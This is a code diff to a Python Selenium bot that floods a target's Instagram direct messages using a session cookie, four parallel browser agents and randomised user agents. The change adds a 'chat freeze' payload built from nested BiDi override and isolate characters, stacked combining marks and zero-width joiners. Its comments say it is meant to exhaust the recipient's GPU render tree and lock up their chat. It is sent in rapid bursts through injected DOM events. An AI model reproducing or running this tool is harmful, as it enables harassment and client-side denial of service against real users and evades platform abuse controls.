@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (JITTER-STICK V75)
-# 📅 STATUS: UI-THRASHING-ACTIVE | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (CHAT-FREEZE V76)
+# 📅 STATUS: COMPOSITOR-LOCK | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,36 +9,36 @@ from selenium_stealth import stealth
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
-# --- ⚡ VELOCITY & SAFETY CONFIG ---
+# --- ⚡ VELOCITY & FREEZE CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.02, 0.1)   # 🔥 Ultra-Fast Delivery
-REST_AFTER_STRIKES = 400   
+BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-Velocity Strike
+REST_AFTER_STRIKES = 500   
 REST_DURATION = 1          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_jitter_sticky_payload():
-    """Generates an unstable layout that forces UI jitter and sticky presence."""
-    u_id = random.randint(1000, 9999)
-    # \u00AD = Soft Hyphen (The 'Jitter' trigger)
-    # \u2068 = FSI (The 'Sticky' vertical trigger)
-    # \u2060 = Word Joiner (The 'Buffer' lock)
-    shy, fsi, pdi, glue = "\u00AD", "\u2068", "\u2069", "\u2060"
+def get_chat_freeze_payload():
+    """Generates a payload that targets the GPU's Command Buffer and Render Tree."""
+    u_id = random.randint(100, 999)
+    # \u202D = BDO (BiDi Override) | \u2068 = FSI (Isolate)
+    # \u034F = CGJ (Combining Joiner) | \u200D = ZWJ
+    bdo, fsi, pdi, cgj, zwj = "\u202D", "\u2068", "\u2069", "\u034F", "\u200D"
+    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) # Stacking marks
+    glue = "\u2060" 
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [TOTAL_STUCK:{u_id}]"
     
     body = []
-    # 400 lines of mathematically unstable text
-    for i in range(400):
-        # We sandwich letters with Soft Hyphens. 
-        # The browser thinks: 'Should I wrap here? Maybe?' 
-        # This causes the 'Jitter' every time a new message loads.
-        word = f"P{shy}R{shy}A{shy}V{shy}E{shy}E{shy}R"
-        line = f"{fsi}{word} PAPA ON TOP{pdi}{glue*10} 🌙 {i}"
-        body.append(line)
+    # 450 lines - Absolute limit of the Instagram Socket
+    for i in range(450):
+        # We create a 'Depth Bomb'. 
+        # Nesting BDO inside FSI forces the browser to create a new layer 
+        # for every word. This exhausts the GPU's Layer Tree.
+        line = f"{fsi}{bdo}P{marks}R{marks}A{marks}V{marks}EER{cgj}{zwj*4}{pdi}"
+        body.append(f"{line} 👑 {i}{glue*5}")
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -51,7 +51,6 @@ def get_driver(agent_id):
         chrome_options.add_argument("--disable-gpu")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
-        # Unique User-Agents to prevent account flagging
         ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
         
@@ -60,7 +59,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Bypasses UI thread lag with direct event injection."""
+    """Direct DOM injection with hardware-event spoofing."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -91,23 +90,23 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_jitter_sticky_payload()
+                payload = get_chat_freeze_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Jitter-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Freeze-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 100 == 0:
+                    if strike_count % 150 == 0:
                         driver.refresh()
-                        time.sleep(10)
+                        time.sleep(8)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             try: driver.quit()
             except: pass
-            time.sleep(5)
+            time.sleep(3)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
